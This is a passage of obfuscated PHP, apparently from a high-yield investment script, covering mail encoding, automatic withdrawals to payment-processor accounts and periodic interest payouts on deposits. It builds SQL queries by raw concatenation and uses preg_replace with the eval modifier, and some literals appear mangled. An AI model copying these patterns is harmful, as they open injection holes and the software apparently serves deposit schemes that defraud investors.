--' . $elnlcrAid . '
Content-Type: text/html;
Content-transfer-encoding: quoted-printable;

' . $elnlcKUbe . '

--' . $elnlcrAid . '--';
    }
    else
    {
      $elnlcFLunJ = $elnlcjiWD;
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']] == $elnlcEuoJk['elnlcMdla'])
    {
      $elnlcbDMeJ = fopen ($elnlcEuoJk['elnlcIGEdL'], $elnlcEuoJk['elnlcjhpli']);
      fwrite ($elnlcbDMeJ, '' . 'TO: ' . $elnlcxQWbE . '
From: ' . $elnlcEUus . '
Subject: ' . $elnlccGEM . '

' . $elnlcjiWD . '

');
      fclose ($elnlcbDMeJ);
    }
    else
    {
      mail ($elnlcxQWbE, $elnlccGEM, $elnlcFLunJ, '' . 'From: ' . $elnlcEUus . '
Reply-To: ' . $elnlcEUus . ($elnlcTnMjL[$elnlcEuoJk['elnlckmao']] ? '' . '
Content-Type: multipart/alternative; boundary=' . $elnlcrAid : ''));
    }

  }

  function elnlckytj ($elnlcQISwH)
  {
    global $elnlcEuoJk;
    $elnlcQISwH = str_replace ('
', '
', $elnlcQISwH);
    $elnlcQISwH = str_replace ('
', '
', $elnlcQISwH);
    return $elnlcQISwH;
  }

  function elnlcfwpri ($elnlcQISwH)
  {
    global $elnlcEuoJk;
    $elnlctWbWs = elnlckytj ($elnlcQISwH);
    if (substr ($elnlctWbWs, 0 - strlen ('
')) != '
')
    {
      $elnlctWbWs .= '
';
    }

    return $elnlctWbWs;
  }

  function elnlcokths ($elnlcQISwH)
  {
    global $elnlcEuoJk;
    $elnlctWbWs = elnlckytj ($elnlcQISwH);
    if (substr ($elnlctWbWs, 0 - strlen ('
')) != '
')
    {
      $elnlctWbWs .= '
';
    }

    $elnlctWbWs = preg_replace ('/([\\000-\\010\\013\\014\\016-\\037\\075\\177-\\377])/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\'))', $elnlctWbWs);
    $elnlctWbWs = preg_replace ('/([	 ])
/e', '\'=\'.sprintf(\'%02X\', ord(\'\\1\')).\'
\'', $elnlctWbWs);
    $elnlctWbWs = elnlcthkoe ($elnlctWbWs, 74, true);
    return $elnlctWbWs;
  }

  function elnlcthkoe ($elnlcdHChE, $elnlcKALw, $elnlcznECE = false)
  {
    global $elnlcEuoJk;
    $elnlcviHRn = ($elnlcznECE ? sprintf (' =%s', '
') : '
');
    $elnlcdHChE = elnlckytj ($elnlcdHChE);
    if (substr ($elnlcdHChE, -1) == '
')
    {
      $elnlcdHChE = substr ($elnlcdHChE, 0, -1);
    }

    $elnlcmrfPA = explode ('
', $elnlcdHChE);
    $elnlcdHChE = '';
    for ($i = 0; $i < count ($elnlcmrfPA); ++$i)
    {
      $elnlcMJrUO = explode (' ', $elnlcmrfPA[$i]);
      $elnlcxObM = '';
      for ($e = $elnlcEuoJk['elnlcTMAG']; $e < count ($elnlcMJrUO); ++$e)
      {
        $elnlcIttxg = $elnlcMJrUO[$e];
        if (($elnlcznECE AND $elnlcKALw < strlen ($elnlcIttxg)))
        {
          $elnlcbePC = $elnlcKALw - strlen ($elnlcxObM) - 1;
          if ($e != 0)
          {
            if (20 < $elnlcbePC)
            {
              $elnlcwIBy = $elnlcbePC;
              if (substr ($elnlcIttxg, $elnlcwIBy - 1, 1) == '=')
              {
                --$elnlcwIBy;
              }
              else
              {
                if (substr ($elnlcIttxg, $elnlcwIBy - 2, 1) == '=')
                {
                  $elnlcwIBy -= 2;
                }
              }

              $elnlcVxqP = substr ($elnlcIttxg, 0, $elnlcwIBy);
              $elnlcIttxg = substr ($elnlcIttxg, $elnlcwIBy);
              $elnlcxObM .= ' ' . $elnlcVxqP;
              $elnlcdHChE .= $elnlcxObM . sprintf ('=%s', '
');
            }
            else
            {
              $elnlcdHChE .= $elnlcxObM . $elnlcviHRn;
            }

            $elnlcxObM = '';
          }

          while (0 < strlen ($elnlcIttxg))
          {
            $elnlcwIBy = $elnlcKALw;
            if (substr ($elnlcIttxg, $elnlcwIBy - 1, 1) == '=')
            {
              --$elnlcwIBy;
            }
            else
            {
              if (substr ($elnlcIttxg, $elnlcwIBy - 2, 1) == '=')
              {
                $elnlcwIBy -= 2;
              }
            }

            $elnlcVxqP = substr ($elnlcIttxg, 0, $elnlcwIBy);
            $elnlcIttxg = substr ($elnlcIttxg, $elnlcwIBy);
            if (0 < strlen ($elnlcIttxg))
            {
              $elnlcdHChE .= $elnlcVxqP . sprintf ('=%s', '
');
              continue;
            }
            else
            {
              $elnlcxObM = $elnlcVxqP;
              continue;
            }
          }

          continue;
        }

        $elnlceoUO = $elnlcxObM;
        $elnlcxObM .= ($e == 0 ? $elnlcIttxg : ' ' . $elnlcIttxg);
        if (($elnlcKALw < strlen ($elnlcxObM) AND $elnlceoUO != ''))
        {
          $elnlcdHChE .= $elnlceoUO . $elnlcviHRn;
          $elnlcxObM = $elnlcIttxg;
          continue;
        }
      }

      $elnlcdHChE .= $elnlcxObM . '
';
    }

    return $elnlcdHChE;
  }

  function elnlcwafh ($elnlcqhoG = '100%')
  {
    return '' . '
<table cellspacing=0 cellpadding=1 border=0 width=' . $elnlcqhoG . ' bgcolor=#FF8D00>
<tr><td bgcolor=#FF8D00>
<table cellspacing=0 cellpadding=0 border=0 width=100%>
<tr>
<td valign=top width=10 bgcolor=#FFFFF2><img src=images/sign.gif></td>
<td valign=top bgcolor=#FFFFF2 style=\'padding: 10px; color: #D20202; font-family: verdana; font-size: 11px;\'>
';
  }

  function elnlcpfgo ()
  {
    return '</td></tr></table></td></tr></table>';
  }

  function elnlccbtp ($elnlcEmcUR, $elnlcdPCw, $elnlcgVMW)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return null;
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcVapCl']] == 1)
    {
      $q = '' . 'select * from hm2_deposits where id = ' . $elnlcEmcUR;
      ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
      $elnlcRDbN = mysql_fetch_array ($elnlcbaLW);
      if (!$elnlcSxjJT[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]][$elnlcEuoJk['elnlcByWGm']])
      {
        return null;
      }

      $q = 'select * from hm2_users where id = ' . $elnlcRDbN[$elnlcEuoJk['elnlccuNQr']];
      ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
      $elnlcEoaEi = mysql_fetch_array ($elnlcbaLW);
      if (($elnlcEoaEi[$elnlcEuoJk['elnlcNuVx']] != 1 OR $elnlcEoaEi[$elnlcEuoJk['elnlcHjfwu']] != 1))
      {
        return null;
      }

      if (0 < $elnlcJutIa[$elnlcEuoJk['elnlcFqqv']])
      {
        $q = 'select sum(actual_amount*(type = \'add_funds\')) as td, sum(actual_amount*(type = \'withdrawal\')) as tw from hm2_history where type in (\'add_funds\', \'withdrawal\')';
        ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
        $elnlcTnMjL = mysql_fetch_array ($elnlcbaLW);
        if (0 < $elnlcTnMjL[$elnlcEuoJk['elnlciDhmr']])
        {
          if ($elnlcJutIa[$elnlcEuoJk['elnlcFqqv']] <= ($elnlcTnMjL[$elnlcEuoJk['elnlckuSA']] + $elnlcdPCw) * 100 / $elnlcTnMjL[$elnlcEuoJk['elnlciDhmr']])
          {
            return null;
          }
        }
      }

      $elnlcJhsUB = unserialize ($elnlcEoaEi[$elnlcEuoJk['elnlcowcVK']]);
      $elnlcdPCw = abs ($elnlcdPCw);
      $elnlcTDCn = floor ($elnlcdPCw * $elnlcJutIa[$elnlcEuoJk['elnlcfJmw']]) / 100;
      if ($elnlcTDCn < $elnlcJutIa[$elnlcEuoJk['elnlcQOvn']])
      {
        $elnlcTDCn = $elnlcJutIa[$elnlcEuoJk['elnlcQOvn']];
      }

      $elnlcGBles = $elnlcdPCw - $elnlcTDCn;
      if ($elnlcGBles < 0)
      {
        $elnlcGBles = $elnlcEuoJk['elnlcTMAG'];
      }

      $elnlcGBles = sprintf ('%.02f', floor ($elnlcGBles * 100) / 100);
      if ($elnlcJutIa[$elnlcEuoJk['elnlclUck']] != '')
      {
        $elnlcjcrt = '' . 'Earning from deposit $' . $elnlcRDbN[$elnlcEuoJk['elnlcGJRR']] . '. Auto withdraw to ' . $elnlcEoaEi[$elnlcEuoJk['elnlcxDSIx']] . ' from ' . $elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']];
      }
      else
      {
        $elnlcjcrt = $elnlcJutIa[$elnlcEuoJk['elnlclUck']];
      }

      $elnlcgPrNl = '' . 'Auto-withdrawal error, tried to send ' . $elnlcGBles . ' earning to ' . $elnlcSxjJT[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]][$elnlcEuoJk['elnlctegj']] . ' account # ' . $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]] . '. Error:';
      if ($elnlcRDbN[$elnlcEuoJk['elnlcFtnn']] == 0)
      {
        list ($elnlcLgkn, $elnlcjiWD, $elnlczpKW) = elnlckofpc ('', $elnlcGBles, $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]], $elnlcjcrt, $elnlcgPrNl);
      }

      if ($elnlcRDbN[$elnlcEuoJk['elnlcFtnn']] == 1)
      {
        list ($elnlcLgkn, $elnlcjiWD, $elnlczpKW) = elnlcyluxu ('', $elnlcGBles, $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]], $elnlcjcrt, $elnlcgPrNl);
      }

      if ($elnlcRDbN[$elnlcEuoJk['elnlcFtnn']] == 2)
      {
        list ($elnlcLgkn, $elnlcjiWD, $elnlczpKW) = elnlcnrqdk ('', $elnlcGBles, $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]], $elnlcjcrt, $elnlcgPrNl);
      }

      if ($elnlcRDbN[$elnlcEuoJk['elnlcFtnn']] == 5)
      {
        list ($elnlcLgkn, $elnlcjiWD, $elnlczpKW) = elnlcueoei ('', $elnlcGBles, $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]], $elnlcjcrt, $elnlcgPrNl);
      }

      if ($elnlcRDbN[$elnlcEuoJk['elnlcFtnn']] == 8)
      {
        list ($elnlcLgkn, $elnlcjiWD, $elnlczpKW) = elnlckrned ('', $elnlcGBles, $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]], $elnlcjcrt, $elnlcgPrNl);
      }

      if ($elnlcRDbN[$elnlcEuoJk['elnlcFtnn']] == 9)
      {
        list ($elnlcLgkn, $elnlcjiWD, $elnlczpKW) = elnlcpsui ('', $elnlcGBles, $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]], $elnlcjcrt, $elnlcgPrNl);
      }

      if ($elnlcRDbN[$elnlcEuoJk['elnlcFtnn']] == 15)
      {
        list ($elnlcLgkn, $elnlcjiWD, $elnlczpKW) = elnlcjsnlj ('', $elnlcGBles, $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]], $elnlcjcrt, $elnlcgPrNl);
      }

      if ($elnlcRDbN[$elnlcEuoJk['elnlcFtnn']] == 16)
      {
        list ($elnlcLgkn, $elnlcjiWD, $elnlczpKW) = elnlcggxpg ('', $elnlcGBles, $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]], $elnlcjcrt, $elnlcgPrNl);
      }

      if ($elnlcRDbN[$elnlcEuoJk['elnlcFtnn']] == 17)
      {
        list ($elnlcLgkn, $elnlcjiWD, $elnlczpKW) = elnlcxgagp ('', $elnlcGBles, $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]], $elnlcjcrt, $elnlcgPrNl);
      }

      if ($elnlcRDbN[$elnlcEuoJk['elnlcFtnn']] == 18)
      {
        list ($elnlcLgkn, $elnlcjiWD, $elnlczpKW) = elnlconwt ('', $elnlcGBles, $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]], $elnlcjcrt, $elnlcgPrNl);
      }

      if ($elnlcRDbN[$elnlcEuoJk['elnlcFtnn']] == 24)
      {
        list ($elnlcLgkn, $elnlcjiWD, $elnlczpKW) = elnlcccbn ('', $elnlcGBles, $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]], $elnlcjcrt, $elnlcgPrNl);
      }

      if ($elnlcLgkn == 1)
      {
        $q = 'insert into hm2_history set
            user_id = ' . $elnlcEoaEi[$elnlcEuoJk['elnlciwGl']] . ('' . ',
        		amount = -' . $elnlcdPCw . ',
            		actual_amount = -' . $elnlcdPCw . ',
        		type=\'withdrawal\',
            		' . $elnlcgVMW . ',
			ec = ') . $elnlcRDbN[$elnlcEuoJk['elnlcFtnn']] . ',
        		description = \'Auto-withdrawal earning to account ' . $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]] . ('' . '. Batch is ' . $elnlczpKW . '\'');
        (mysql_query ($q) OR print mysql_error ());
        $elnlcfqOum = array ();
        $elnlcfqOum[$elnlcEuoJk['elnlcxDSIx']] = $elnlcEoaEi[$elnlcEuoJk['elnlcxDSIx']];
        $elnlcfqOum[$elnlcEuoJk['elnlctegj']] = $elnlcEoaEi[$elnlcEuoJk['elnlctegj']];
        $elnlcfqOum[$elnlcEuoJk['elnlcMOxFJ']] = $elnlcdPCw;
        $elnlcfqOum[$elnlcEuoJk['elnlcGPoCs']] = $elnlczpKW;
        $elnlcfqOum[$elnlcEuoJk['elnlcjnGN']] = $elnlcJhsUB[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]];
        $elnlcfqOum[$elnlcEuoJk['elnlcWkrr']] = $elnlcSxjJT[$elnlcRDbN[$elnlcEuoJk['elnlcFtnn']]][$elnlcEuoJk['elnlctegj']];
        elnlcgjtfr ('withdraw_user_notification', $elnlcEoaEi[$elnlcEuoJk['elnlcaDcW']], $elnlcJutIa[$elnlcEuoJk['elnlcznBTd']], $elnlcfqOum);
        elnlcgjtfr ('withdraw_admin_notification', $elnlcJutIa[$elnlcEuoJk['elnlcznBTd']], $elnlcJutIa[$elnlcEuoJk['elnlcznBTd']], $elnlcfqOum);
      }
    }

  }

  function elnlcriqat ($elnlcQjzjO)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    $elnlcVqFdz = array ();
    if (($elnlcJutIa[$elnlcEuoJk['elnlcoNrc']] == 1 AND $elnlcQjzjO != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
    while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
    {
      $elnlcVqFdz[$elnlcTnMjL[$elnlcEuoJk['elnlcpzHPR']]][$elnlcTnMjL[$elnlcEuoJk['elnlciwGl']]] = $elnlcTnMjL;
    }

    $elnlcDrDrs = $elnlcEuoJk['elnlcRMbnT'];
    $elnlcNzxN = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcQjzjO == -1)
    {
      $elnlcNzxN = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcQjzjO . ' and status = \'on\'';
    }

    if ($elnlcQjzjO == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcctGwF = mysql_query ($q) OR print mysql_error ());
    while ($elnlcxSCRb = mysql_fetch_array ($elnlcctGwF))
    {
      $elnlcwlzeP = $elnlcxSCRb[$elnlcEuoJk['elnlciwGl']];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcwlzeP;
      (mysql_query ($q) OR print mysql_error ());
      $elnlcDrDrs = $elnlcEuoJk['elnlcRMbnT'];
      $elnlcWivT = ' ((t.work_week = 1)*(floor(q_days / 5) * 7 + q_days % 5 + ((q_days % 5 + WEEKDAY(deposit_date)) > 5)*2 - 1) + (t.work_week = 0)*(t.q_days)) ';
      while (0 < $elnlcDrDrs)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit,
              ' . $elnlcWivT . ' as q_days1
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcwlzeP . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((' . $elnlcWivT . ' + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or ' . $elnlcWivT . ' = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval ' . $elnlcWivT . ' + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((' . $elnlcWivT . ' = 0) or 
                (               
                (d.deposit_date + interval ' . $elnlcWivT . ' + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval ' . $elnlcWivT . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval ' . $elnlcWivT . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval ' . $elnlcWivT . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval ' . $elnlcWivT . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval ' . $elnlcWivT . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval ' . $elnlcWivT . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval ' . $elnlcWivT . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval ' . $elnlcWivT . ' + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (' . $elnlcWivT . ' > 0 and t.period = \'end\') 
              ))';
        ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
        $elnlcDrDrs = $elnlcEuoJk['elnlcTMAG'];
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          ++$elnlcDrDrs;
          if (!isset ($elnlcVqFdz[$elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']]]))
          {
            continue;
          }

          $elnlcGGxPb = $elnlcEuoJk['elnlcTMAG'];
          $elnlcUIzCR = $elnlcEuoJk['elnlcTMAG'];
          reset ($elnlcVqFdz);
          reset ($elnlcVqFdz[$elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']]]);
          while (list ($elnlcjgHVx, $elnlcNdIze) = each ($elnlcVqFdz[$elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']]]))
          {
            if (($elnlcNdIze[$elnlcEuoJk['elnlcQFob']] <= $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] AND ($elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] <= $elnlcNdIze[$elnlcEuoJk['elnlcAAKd']] OR $elnlcNdIze[$elnlcEuoJk['elnlcAAKd']] == 0)))
            {
              $elnlcGGxPb = $elnlcNdIze[$elnlcEuoJk['elnlcicuKE']];
            }

            if (($elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] < $elnlcNdIze[$elnlcEuoJk['elnlcQFob']] AND $elnlcGGxPb == 0))
            {
              $elnlcGGxPb = $elnlcUIzCR;
            }

            if (($elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] < $elnlcNdIze[$elnlcEuoJk['elnlcQFob']] AND 0 < $elnlcGGxPb))
            {
              break;
            }

            $elnlcUIzCR = $elnlcNdIze[$elnlcEuoJk['elnlcicuKE']];
          }

          if (($elnlcNdIze[$elnlcEuoJk['elnlcAAKd']] != 0 AND $elnlcNdIze[$elnlcEuoJk['elnlcAAKd']] < $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']]))
          {
            $elnlcGGxPb = $elnlcUIzCR;
          }

          $elnlcCEUNG = $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] * $elnlcGGxPb / 100;
          $elnlchRExl = '';
          if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlczBIx'])
          {
            $elnlchRExl = ' 1 day ';
          }
          else
          {
            if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'])
            {
              $elnlchRExl = ' 1 hour ';
            }
            else
            {
              if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcQWmx'])
              {
                $elnlchRExl = ' 7 day ';
              }
              else
              {
                if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == 'b-w')
                {
                  $elnlchRExl = ' 14 day ';
                }
                else
                {
                  if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlctKdcx'])
                  {
                    $elnlchRExl = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcWsvHa'])
                    {
                      $elnlchRExl = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcUEQok'])
                      {
                        $elnlchRExl = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcQTmA'])
                        {
                          $elnlchRExl = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcgGyV'])
                          {
                            $elnlchRExl = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlckgRG'])
                            {
                              $elnlchRExl = ' ' . $elnlcTnMjL[$elnlcEuoJk['elnlcwNFK']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcGGxPb == 0 AND $elnlchRExl == ''))
          {
            continue;
          }

          $elnlcWsTb = -1;
          $q = 'select weekday(\'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ') as dw');
          ($elnlciPGsk = mysql_query ($q) OR print mysql_error ());
          while ($elnlcGukIR = mysql_fetch_array ($elnlciPGsk))
          {
            $elnlcWsTb = $elnlcGukIR[$elnlcEuoJk['elnlcmhGF']];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? ' date_format(date, \'%Y-%m-%d %H\') = date_format(\'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ', \'%Y-%m-%d %H\') and') : 'to_days(date) = to_days(\'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ') and ')) . ' deposit_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
          ($elnlcvAkrE = mysql_query ($q) OR print mysql_error ());
          $elnlcLDnww = $elnlcEuoJk['elnlcTMAG'];
          while ($elnlceHtV = mysql_fetch_array ($elnlcvAkrE))
          {
            $elnlcLDnww = $elnlceHtV[$elnlcEuoJk['elnlcbiVt']];
          }

          if ($elnlcLDnww == 0)
          {
            if ((5 <= $elnlcWsTb AND $elnlcTnMjL[$elnlcEuoJk['elnlcWhGEq']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcWsTb == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                    ec = ') . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ('' . ',
                    amount = ' . $elnlcCEUNG . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcJutIa[$elnlcEuoJk['elnlcoaQSz']] . number_format ($elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']], 2) . ('' . ' - ' . $elnlcGGxPb . ' %\',
                    actual_amount = ' . $elnlcCEUNG . ',
                    date = \'') . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                    ec = ') . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
            }

            (mysql_query ($q) OR print mysql_error ());
          }

          $elnlcznNn = '';
          if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlckgRG'])
          {
            if (($elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] == 0 OR ($elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcgJuc']])))
            {
              $elnlcznNn = ', status = \'off\'';
            }

            if (($elnlcTnMjL[$elnlcEuoJk['elnlcMhIea']] == 1 AND ($elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] == 0 OR ($elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcgJuc']]))))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ',
                    amount = ' . $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] . ',
                    ec = ' . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
                    date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                    deposit_id = ') . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $elnlcWsTb AND $elnlcTnMjL[$elnlcEuoJk['elnlcWhGEq']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] <= 100) AND $elnlcTnMjL[$elnlcEuoJk['elnlcgRBBC']] == 1))
              {
                if ($elnlcTnMjL[$elnlcEuoJk['elnlcuafl']] == 0)
                {
                  $elnlcTnMjL[$elnlcEuoJk['elnlcuafl']] = $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] + 1;
                }

                if (($elnlcTnMjL[$elnlcEuoJk['elnlcaWrN']] <= $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] <= $elnlcTnMjL[$elnlcEuoJk['elnlcuafl']]))
                {
                  if ($elnlcTnMjL[$elnlcEuoJk['elnlcVJgiM']] == 1)
                  {
                    $elnlcSJCUR = preg_split ('/\\s*,\\s*/', $elnlcTnMjL[$elnlcEuoJk['elnlcVAqsQ']]);
                    if (!in_array ($elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']], $elnlcSJCUR))
                    {
                      $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] = $elnlcSJCUR[0];
                    }
                  }
                  else
                  {
                    if ($elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] < $elnlcTnMjL[$elnlcEuoJk['elnlcJoei']])
                    {
                      $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] = $elnlcTnMjL[$elnlcEuoJk['elnlcJoei']];
                    }

                    if ($elnlcTnMjL[$elnlcEuoJk['elnlcvbav']] < $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']])
                    {
